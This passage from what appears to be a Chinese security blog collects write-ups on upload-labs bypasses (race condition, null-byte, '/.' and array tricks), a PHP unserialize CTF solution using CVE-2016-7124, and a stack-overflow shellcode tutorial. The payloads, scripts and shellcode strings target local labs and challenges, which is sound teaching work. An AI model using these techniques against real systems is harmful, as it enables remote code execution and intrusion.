127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/Pass-17/index.phpCookie: pass=17Connection: closeUpgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=---------------------------6696274297634Content-Length: 341-----------------------------6696274297634Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;17.php&quot;Content-Type: application/octet-stream&lt;?php phpinfo();?&gt;-----------------------------6696274297634Content-Disposition: form-data; name=&quot;submit&quot;上传-----------------------------6696274297634--&quot;&quot;&quot; code, head, html, redirect, log = hh.http(&#x27;http://127.0.0.1/Pass-17/index.php&#x27;, raw=raw) print(str(code) + &quot;\\r&quot;)pool = ThreadPool(200)pool.map(upload, range(100000))pool.close()pool.join() Pass-18 条件竞争123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118//index.php$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; require_once(&quot;./myupload.php&quot;); $imgFileName =time(); $u = new MyUpload($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;size&#x27;],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = &#x27;文件已经被上传，但没有重命名。&#x27;; break; case -1: $msg = &#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;; break; case -2: $msg = &#x27;上传失败，上传目录不可写。&#x27;; break; case -3: $msg = &#x27;上传失败，无法上传该类型文件。&#x27;; break; case -4: $msg = &#x27;上传失败，上传的文件过大。&#x27;; break; case -5: $msg = &#x27;上传失败，服务器已经存在相同名称文件。&#x27;; break; case -6: $msg = &#x27;文件无法上传，文件不能复制到目标目录。&#x27;; break; default: $msg = &#x27;未知错误！&#x27;; break; &#125;&#125;//myupload.phpclass MyUpload&#123;.................. var $cls_arr_ext_accepted = array( &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;, &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );.................. /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir )&#123; $ret = $this-&gt;isUploadedFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;setDir( $dir ); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkExtension(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkSize(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 )&#123; $ret = $this-&gt;checkFileExists(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 )&#123; $ret = $this-&gt;renameFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, everything worked as planned :) return $this-&gt;resultUpload( &quot;SUCCESS&quot; ); &#125;.................. &#125;; move文件在rename前面，利用条件竞争，上传图片马 2. 利用 无限重放，我这没跑出来😂 Pass-19 /. or 0x00绕过1. 分析12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#x27;save_name&#x27;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125;else&#123; $msg = &#x27;禁止保存为该类型文件！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 通过代码，发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过。 当然，因为move_uploaded_file会忽略掉文件末尾的/., 所以我们也可以用/.绕过 2. 利用/.绕过 Pass-20 数组+/.绕过1. 代码分析123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123; //检查MIME $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;); if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123; $msg = &quot;禁止上传该类型文件!&quot;; &#125;else&#123; //检查文件名 $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file)); &#125; $ext = end($file); $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;禁止上传该后缀文件!&quot;; &#125;else&#123; $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;文件上传成功！&quot;; $is_upload = true; &#125; else &#123; $msg = &quot;文件上传失败！&quot;; &#125; &#125; &#125;&#125;else&#123; $msg = &quot;请选择要上传的文件！&quot;;&#125; 第5行先检查MIME类型，然后判断save_name参数是否为空，为空就把文件本来名称赋值给$file,否则就是将save_name参数的值赋给它。紧接着判断$file是否是数组，如果不是数组则将其拆成数组，这里explode 根据.分割，返回值为数组 explode() 函数把字符串打散为数组 语法：explode(separator,string,limit) 参数 描述 separator 必需。规定在哪里分割字符串。 string 必需。要分割的字符串。 limit 可选。规定所返回的数组元素的数目。可能的值：大于 0 - 返回包含最多 limit 个元素的数组小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组0 - 返回包含一个元素的数组 返回值： 返回字符串的数组 数组最后一个的值(end函数就是取数组最后一个的值)同白名单做比较，符合jpg、png、gif中的一种就允许上传了 ​ 在允许上传之后还要把数组的值拼接在一起对文件进行重命名。所以我们可以构造: save_name[0]=tao.php/ save_name[1]置为空 save_name[2]=jpg(白名单后缀校验) reset() 函数将内部指针指向数组中的第一个元素，并输出 reset($file)取的是数组的第一个元素即tao.php/，然后接了一个’.’符号，之后又将数组最后一个元素内容拼接到一起 Q：可能有的人会疑问数组最后一个值不是jpg吗？ A：其实当我们只设置了两个数组元素的时候，数组的元素个数就只有两个了。原因如下图： 之后第20对$file_name进行的拼接，因为$save_name[2-1] = $save_name[1] =空, 所以最后$file_name的值为tao.php/. 那么最后利用原理就跟Pass19一样了，对于像tao.php/.这样的文件路径，move_uploaded_file()函数会忽略掉文件末尾的/.。如此一来上传的就是php文件后缀了 2. 利用burp抓包上传","categories":[{"name":"web安全","slug":"web安全","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"php安全","slug":"php安全","permalink":"https://taonn.github.io/tags/php%E5%AE%89%E5%85%A8/"}]},{"title":"攻防世界-Web_php_unserialize Writeup","slug":"攻防世界-Web-php-unserialize-Writeup","date":"2020-10-22T02:51:00.000Z","updated":"2021-03-16T05:27:56.125Z","comments":true,"path":"2020/10/22/攻防世界-Web-php-unserialize-Writeup/","link":"","permalink":"https://taonn.github.io/2020/10/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web-php-unserialize-Writeup/","excerpt":"","text":"题目123456789101112131415161718192021222324252627&lt;?php class Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &#x27;index.php&#x27;) &#123; //the secret is in the fl4g.php $this-&gt;file = &#x27;index.php&#x27;; &#125; &#125; &#125;if (isset($_GET[&#x27;var&#x27;])) &#123; $var = base64_decode($_GET[&#x27;var&#x27;]); if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var)) &#123; die(&#x27;stop hacking!&#x27;); &#125; else &#123; @unserialize($var); &#125; &#125; else &#123; highlight_file(&quot;index.php&quot;); &#125; ?&gt; 解题代码分析代码是从17行开始执行的： 首先判断是否存在GET参数var, 若存在则对其进行Base64解码后存入$var变量，若不存在，执行25行的代码，高亮输出当前页面的源码 解码后对$var进行一个正则的匹配，匹配到的话直接结束（die）并显示 stop hacking!**，如果没匹配到就反序列化** 源代码中给出了Demo类，这里我们需要知道这三个魔术方法： __construct()：php构造方法，具有构造方法的类会在每次创建新对象前调用此方法 ，该方法常用于完成一些初始化工作， __destruct()：php析构方法，当 某个对象的所有引用都被删除 或者 当对象被显式销毁 时，会执行此方法。 __wakeup()：PHP反序列化时执行的第一个方法， unserialize()会先检查是否存在 __wakeup() 方法 ， 若存在则会先调用该方法 ， 来预先准备对象需要的资源( 比如重新建立数据库连接 ， 执行其他初始化操作等等 ) 更多有关PHP魔法方法的内容可以参考：https://www.php.net/manual/zh/language.oop5.magic.php 接下来分析Demo类， 执行__construct()方法，将传入的 $file 赋值给本地的私有方法 $file 销毁时执行 __destruct() 方法，高亮本地变量 $file所指向 文件的代码 这里需要注意第12行的注释： 1//the secret is in the fl4g.php 明示了我们flag在fl4g.php文件中 序列化和反序列化 更详细的说明，参考：深度剖析PHP序列化和反序列化 解题思路我们需要注意两个点，上面的代码是从17行开始执行的，而且unserialize()方法的参数来源与GET请求，请求值经过了base64 和 正则匹配， 主要的是参数是可控的（对与我们来说） 还有一个要注意的点就是__wakeup()方法，因为我们的flag在fl4g.php文件中，所以我们需要绕过__wakeup()函数，这里就可以利用CVE-2016-7124的漏洞：即当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 1preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var) 还有一点说明，就是这里正则匹配的规则是: 在不区分大小写的情况下 ， 若字符串出现 “o:数字” 或者 “c:数字’ 这样的格式 ， 那么就被过滤 . 而serialize() 的参数为 object ，因此参数类型肯定为对象 “ O “ ， 又因为序列化字符串的格式为 参数格式:参数名长度 ， 因此 &quot; O:4 &quot; 这样的字符串肯定无法通过正则匹配 绕过正则的匹配，我们可以在4加上+来绕过，因为在 php 语法中，+4 = 4 1234567&lt;?php echo 4; echo &#x27;&lt;br&gt;&#x27;; echo +4; echo &#x27;&lt;br&gt;&#x27;; echo -4;?&gt; 更深入的了解可以参考：php反序列unserialize的一个小特性 绕过__wakeup()，这里就可以利用CVE-2016-7124的漏洞：即当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 构造pyload 12345678910111213141516171819202122232425262728&lt;?phpclass Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &#x27;index.php&#x27;) &#123; //the secret is in the fl4g.php $this-&gt;file = &#x27;index.php&#x27;; &#125; &#125; &#125;$t = new Demo(&#x27;fl4g.php&#x27;);$b = serialize($t);echo $b.&#x27;&lt;br /&gt;&#x27;; // O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;$b = str_replace(&#x27;O:4&#x27;, &#x27;O:+4&#x27;, $b); //绕过preg_match$b = str_replace(&#x27;:1:&#x27;, &#x27;:2:&#x27;, $b); //绕过__wakeupecho $b.&#x27;&lt;br /&gt;&#x27;; // O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;echo base64_encode($b);?&gt; 上面的代码为什么用str_replace()替换，而不是直接复制粘贴，然后编码呢? 这就涉及到私有属性序列化以后，会产生%00的问题，后面详细分析， 我们通过思路，构造payload如下： ?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== 解释一下上面的问题 Demo类序列化的结果如下： 1O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125; 注意s:10:&quot;Demofile&quot;, 明明Demofile是8个字符， 为什么这里显示s:10呢? 为了更清晰的显示为什么，我们用urlencode()打印上面的值 这里s:10, 就是因为这里两个%00导致的。 这里为什么要说这个？%00有什么影响嘛? 这里的坑就在：如果我们直接复制文本进行base64编码，会丢失%00, 再 解码-&gt;反序列化 自然与我之前序列化的 Demo 不相同 对于这里，解决方法就是，使用str_replace替换， 我们通过对比，来观察一下他们有什么不同： 1234567891011121314151617181920212223242526272829303132&lt;?phpclass Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &#x27;index.php&#x27;) &#123; //the secret is in the fl4g.php $this-&gt;file = &#x27;index.php&#x27;; &#125; &#125; &#125;$t = new Demo(&#x27;fl4g.php&#x27;);$b = serialize($t);echo $b.&#x27;&lt;br /&gt;&#x27;; // O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;$b = str_replace(&#x27;O:4&#x27;, &#x27;O:+4&#x27;, $b); //绕过preg_match$b = str_replace(&#x27;:1:&#x27;, &#x27;:2:&#x27;, $b); //绕过__wakeupecho base64_encode(&#x27;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;&#x27;);echo &#x27;&lt;br /&gt;&#x27;;echo base64_encode($b);echo &quot;&lt;hr&gt;&quot;;echo base64_decode(&quot;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==&quot;);echo &quot;&lt;br /&gt;&quot;;echo urlencode(base64_decode(&quot;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==&quot;));?&gt; 总结： php 中 4 = +4 ，可以用来绕过正则匹配 绕过__wakeup()，这里就可以利用CVE-2016-7124的漏洞：即当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 私有属性(private)列化后， 会在属性名前加上类名，类名的左右会加有%00","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://taonn.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://taonn.github.io/tags/CTF/"}]},{"title":"shellcode编写(三)","slug":"shellcode编写-三","date":"2020-10-06T00:31:03.000Z","updated":"2021-03-16T05:28:48.611Z","comments":true,"path":"2020/10/06/shellcode编写-三/","link":"","permalink":"https://taonn.github.io/2020/10/06/shellcode%E7%BC%96%E5%86%99-%E4%B8%89/","excerpt":"","text":"切入正题，这次我们进行shellcode编写，只是基础的编写，不会涉及的太复杂，我们这次编写的shellcode就是让程序自动弹出一个对话框，我这里使用的c语言中的MessageBox()这个函数来进行编写。 我们首先需要做的就是获取调用MessageBox()这个函数的API.所以说，我们就需要获取该函数的地址 12345678910111213141516#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef void (*MYPROC)(LPTSTR);int main()&#123; HINSTANCE LibHandle; MYPROC ProcAdd; LibHandle = LoadLibrary(&quot;user32&quot;); //获取user32.dll的地址 printf(&quot;user32 = 0x%x\\n&quot;, LibHandle); //获取MessageBoxA的地址 ProcAdd=(MYPROC)GetProcAddress(LibHandle,&quot;MessageBoxA&quot;); printf(&quot;MessageBoxA = 0x%x\\n&quot;, ProcAdd); getchar(); return 0;&#125; 执行结果如下： MessageBox()函数在我们系统中的地址为0x77d507ea 当然这个地址在不同的系统中，应该是不同的，所以我们在编写ShellCode之前，一定要先查找所要调用的API函数的地址 ，由于我们利用溢出操作破坏了原本的栈空间的内容，这就可能会在我们的对话框显示完后，导致程序崩溃，所以为了谨慎起见，我们这里还需要使用ExitProcess()函数来令程序终止。这个函数位于kernel32.dll里面，所以这里同样可以使用上述程序进行函数地址的查找，只要稍微修改一下就可以了： 12345678910111213141516#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef void (*MYPROC)(LPTSTR);int main()&#123; HINSTANCE LibHandle; MYPROC ProcAdd; LibHandle = LoadLibrary(&quot;kernel32&quot;); // 这里 //获取user32.dll的地址 printf(&quot;kernel32 = 0x%x\\n&quot;, LibHandle); //获取MessageBoxA的地址 ProcAdd=(MYPROC)GetProcAddress(LibHandle,&quot;ExitProcess&quot;); // 这里 printf(&quot;ExitProcess = 0x%x\\n&quot;, ProcAdd); getchar(); return 0;&#125; 运行结果如下: ExitProcess()地址是0x7c81cafa 接下来，我们就开始编写汇编代码。 在汇编语言中，想调用某个函数，是需要使用CALL语句的，而在CALL语句的后面，需要跟上该函数在系统中的地址。因为我刚才已经获取到了MessageBox()与ExitProcess()函数的地址，所以我们在这里就可以通过CALL相应的地址的方法来调用相应的函数。但是实际上，我们在编程的时候，一般还是先将地址赋给诸如eax这样的寄存器，然后再CALL相应的寄存器，从而实现调用的 。 如果说我们想要调用的函数还包含有参数，那么我们就需要先将参数利用PUSH语句从右至左分别入栈，之后再调用CALL语句。比如现在有一个Function(a,b,c)函数，我们想调用它，那么它的汇编代码就应该编写为： 12345push cpush bpush amov eax,Addrssfunctioncall eax 根据这个思想，我们就可以在VC++中利用内联汇编来调用 ExitProcess()这个函数： 1234xor ebx,ebx # ebx &#x3D; 0push ebxmov eax, 0x7c81cafacall eax 接下来编写MessageBox()这个函数调用。与上一个函数不同的是，这个API函数包含有四个参数，当然第一和第四个参数，我们可以赋给0值，但是中间两个参数都包含有较长的字符串，这时候就要把所需要用到的字符串转换为ASCII码值： 12345678910111213# 然后将每四个字符为一组，进行分组，将不满四个字符的，以空格（x20）进行填充warning:\\x57\\x61\\x72\\x6e\\x69\\x6e\\x67\\x20You have been hacked!(by Taoy):\\x59\\x6f\\x75\\x20\\x68\\x61\\x76\\x65\\x20\\x62\\x65\\x65\\x6e\\x20\\x68\\x61\\x63\\x6b\\x65\\x64\\x21\\x28\\x62\\x79\\x20\\x54\\x61\\x6f\\x79\\x29\\x20\\x20 ​ 这里之所以需要以x20进行填充，而不是x00进行填充，就是因为我们现在所利用的是strcpy的漏洞，而这个函数只要一遇到x00就会认为我们的字符串结束了，就不会再拷贝x00后的内容了 由于我们的计算机是小端显示，因此字符的进展顺序是从后往前不断进栈的，即Warning的进栈顺序为： 12push 0x20676e69push 0x6e726157 &#x2F;&#x2F; push &quot;Warning&quot; 我们如何获取这两个字符串的地址 ? 我们可以利用esp指针，因为esp始终指向栈顶的位置，所以我们将字符压入栈以后，将esp的值赋给别的相应的寄存器即可mov eax,esp 或 mov ebx,esp 如此，我们在进行函数的调用 123456push ebxpush eaxpush ecxpush ebxmov eax, 0x77d507eacall eax &#x2F;&#x2F; call MessageBox 我们将代码写入vc6.0++, 完整代码如下: 12345678910111213141516171819202122232425262728293031int main()&#123; _asm&#123; sub esp,0x50 xor ebx,ebx push ebx // cut string push 0x20676e69 push 0x6e726157 // push &quot;Warning&quot; mov eax,esp push ebx // cut string push 0x20202979 push 0x6f615420 push 0x79622821 push 0x64656b63 push 0x6168206e push 0x65656220 push 0x65766168 push 0x20756f59 // push &quot;You have been hacked!(by Taoy)&quot; mov ecx,esp push ebx push eax push ecx push ebx mov eax,0x77d507ea call eax // call MessageBox push ebx mov eax, 0x7c81cafa call eax // call ExitProcess &#125;return 0;&#125; 然后我们通过调试来提取shellcode. 按下F9左侧有个红色的圆圈出现后，然后按F5进入调试，然后alt + 8,显示机器码 将这个汇编指令转换的机器码提取出来即可,提取完机器码, 完整的shellcode以及程序代码如下： 1234567891011121314151617181920212223242526272829char name[] &#x3D;&quot;\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41&quot; &#x2F;&#x2F;name[0]~name[7]&quot;\\x42\\x42\\x42\\x42&quot; &#x2F;&#x2F;EBP&quot;\\x79\\x5b\\xe3\\x77&quot; &#x2F;&#x2F;ReturnAddress&quot;\\x83\\xEC\\x50&quot; &#x2F;&#x2F;subesp,0x50&quot;\\x33\\xDB&quot; &#x2F;&#x2F;xorebx,ebx&quot;\\x53&quot; &#x2F;&#x2F;pushebx&quot;\\x68\\x69\\x6E\\x67\\x20&quot;&quot;\\x68\\x57\\x61\\x72\\x6E&quot; &#x2F;&#x2F;push&quot;Warning&quot;&quot;\\x8B\\xC4&quot; &#x2F;&#x2F;moveax,esp&quot;\\x53&quot; &#x2F;&#x2F;pushebx&quot;\\x68\\x79\\x29\\x20\\x20&quot;&quot;\\x68\\x20\\x54\\x61\\x6f&quot;&quot;\\x68\\x21\\x28\\x62\\x79&quot;&quot;\\x68\\x63\\x6B\\x65\\x64&quot;&quot;\\x68\\x6E\\x20\\x68\\x61&quot;&quot;\\x68\\x20\\x62\\x65\\x65&quot;&quot;\\x68\\x68\\x61\\x76\\x65&quot;&quot;\\x68\\x59\\x6F\\x75\\x20&quot; &#x2F;&#x2F;push&quot;Youhavebeenhacked!(byJ.Y.)&quot;&quot;\\x8B\\xCC&quot; &#x2F;&#x2F;movecx,esp&quot;\\x53&quot; &#x2F;&#x2F;pushebx&quot;\\x50&quot; &#x2F;&#x2F;pusheax&quot;\\x51&quot; &#x2F;&#x2F;pushecx&quot;\\x53&quot; &#x2F;&#x2F;pushebx&quot;\\xB8\\xea\\x07\\xd5\\x77&quot;&quot;\\xFF\\xD0&quot; &#x2F;&#x2F;callMessageBox&quot;\\x53&quot;&quot;\\xB8\\xFA\\xCA\\x81\\x7C&quot;&quot;\\xFF\\xD0&quot;; 由于我们这里调用了MessageBox，因此需要在源程序中加入LoadLibrary(“user32.dll”);这条语句用于加载相应的动态链接库，而由于使用了LoadLibrary()，还需要加入windows.h这个头文件。 此时代码为： 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;char name[] =&quot;\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41&quot; //name[0]~name[7]&quot;\\x42\\x42\\x42\\x42&quot; //EBP&quot;\\x79\\x5b\\xe3\\x77&quot; //ReturnAddress&quot;\\x83\\xEC\\x50&quot; //subesp,0x50&quot;\\x33\\xDB&quot; //xorebx,ebx&quot;\\x53&quot; //pushebx&quot;\\x68\\x69\\x6E\\x67\\x20&quot;&quot;\\x68\\x57\\x61\\x72\\x6E&quot; //push&quot;Warning&quot;&quot;\\x8B\\xC4&quot; //moveax,esp&quot;\\x53&quot; //pushebx&quot;\\x68\\x79\\x29\\x20\\x20&quot;&quot;\\x68\\x20\\x54\\x61\\x6f&quot;&quot;\\x68\\x21\\x28\\x62\\x79&quot;&quot;\\x68\\x63\\x6B\\x65\\x64&quot;&quot;\\x68\\x6E\\x20\\x68\\x61&quot;&quot;\\x68\\x20\\x62\\x65\\x65&quot;&quot;\\x68\\x68\\x61\\x76\\x65&quot;&quot;\\x68\\x59\\x6F\\x75\\x20&quot; //push&quot;Youhavebeenhacked!(by Taoy)&quot;&quot;\\x8B\\xCC&quot; //movecx,esp&quot;\\x53&quot; //pushebx&quot;\\x50&quot; //pusheax&quot;\\x51&quot; //pushecx&quot;\\x53&quot; //pushebx&quot;\\xB8\\xea\\x07\\xd5\\x77&quot;&quot;\\xFF\\xD0&quot; //callMessageBox&quot;\\x53&quot;&quot;\\xB8\\xFA\\xCA\\x81\\x7C&quot;&quot;\\xFF\\xD0&quot;;int main()&#123; char buffer[8]; LoadLibrary(&quot;user32.dll&quot;); // 加载 user32.dll 动态链接库 strcpy(buffer, name); printf(&quot;%s\\n&quot;,buffer); getchar(); return 0;&#125; 然后运行程序，可以看到我们已经成功利用了漏洞： 我们接下来使用OD调试，一步一步跟进，发现指向完jmp esp，跳转到了我们的shellcode处 我们继续往下,下图显示的过程就是把MessageBox()函数的参数入栈，然后call 这个函数 最后，我们观察一下数据以及堆栈的情况： 我们跳转到esp处（在数据区域, ctrl+G, 输入 esp），查看栈区域的数据: 参考： https://blog.csdn.net/ioio_jy/article/details/48316111","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://taonn.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"溢出攻击","slug":"溢出攻击","permalink":"https://taonn.github.io/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"}]},{"title":"缓冲区溢出的利用(二)","slug":"缓冲区溢出的利用-二","date":"2020-10-06T00:28:44.000Z","updated":"2021-03-16T05:28:15.096Z","comments":true,"path":"2020/10/06/缓冲区溢出的利用-二/","link":"","permalink":"https://taonn.github.io/2020/10/06/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8-%E4%BA%8C/","excerpt":"","text":"我们这次的环境跟上一篇一样，上一篇只是分析了发生的原因，这一篇我们就对产生缓冲区溢出进行利用，还是之前那两个程序test1.exe and test2.exe的基础上进行讲解，所以上一篇一定要理解！！！ 缓冲区溢出程序，test2.exe代码如下： 12345678910111213#include&lt;stdio.h&gt; #include&lt;string.h&gt; //引入头文件char name[] = &quot;betaobetaobetao&quot;; //定义全局变量,！！！ 注意，这里多了两个betaoint main() //返回值 主函数main()&#123; char buffer[8]; //开辟8个字节的空间用来存储变量name strcpy(buffer,name); //内置函数（作用）：将变量name内容赋值给buffer变量 printf(&quot;%s\\n&quot;,buffer); //输出 getchar(); //方便观察 作用：等待用户输入按键 return 0; //返回值&#125; 这里我们需要分成几个步骤： 1.精确定位返回地址的位置 2.寻找覆盖原始返回地址的地址 3.编写shellcode到相应的缓冲区(这一步会涉及很多东西，汇编语言等，所以下一篇说) 经过上一篇，补充内容中，我们通过程序报错的显示，很快的找到了Address,报错地址是0x006f6174,我们通过把十六进制转换成ASCII码： 这里的`tao`正好是我们输入那一串长字符的最后三个字母，由于地址是4个字节表示，如果我将全局变量`name`赋值为`betaobetaobeXXXX`那么也就是说，四个`X`就是我们覆盖的返回地址，我们上次也说了，`buffer`变量只有8个字节的空间，后面四个字节`aobe`是父函数EBP的地址，到这里，我们也就解决了第一个问题----&gt; **精确定位返回地址的位置**。 ​ 这里还有一个问题需要说明一下，因为我们这个程序的局部变量buffer只有8个字节，因此很容易就能够被填充满，从而很容易就能够被定位，但是如果缓冲区空间很大，该如何定位呢？总不能还是重复betaobetaobetao...吧，我们这里使用26个大写字符与小写字符，一共52个字符进行测试，一次就可以验证52个字节的缓冲区空间。 ​ 我们这里修改局部变量数组大小为80,我们加两端英文字符，也就是104个字符。 12345678910111213#include&lt;stdio.h&gt; #include&lt;string.h&gt; //引入头文件char name[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;; //定义全局变量,！！！int main() //返回值 主函数main()&#123; char buffer[80]; //开辟80个字节的空间用来存储变量name ！！！ strcpy(buffer,name); //内置函数（作用）：将变量name内容赋值给buffer变量 printf(&quot;%s\\n&quot;,buffer); //输出 getchar(); //方便观察 作用：等待用户输入按键 return 0; //返回值&#125; 将以上C代码程序编译…,然后运行 ​ 在Address后可以发现，其值为0x6a696867，注意我们的系统是小端显示，也就是说，实际的字符应该是0x67、0x68、0x69、0x6a。那么把它转换成字母，可以知道是g、h、i、j 通过python转换成ASCII码： 我们来分析一下，为什么是ghij,看下图 ok,我们回到我们简单的程序 ​ 经过上面的分析，我们还需要确定betaobetaobeXXXX中的最后四个“X”应该是什么地址。这里我们不能凭空创造一个地址，而是应该基于一个合法地址的基础之上。当然我们通过在OD中的观察，确实能够找到很多合适的地址，但是这种方法不具有通用性，毕竟要找一个确切的地址还是不那么方便的。解决这个问题的方法有很多种，但是最为常用最为经典的，就是jmp 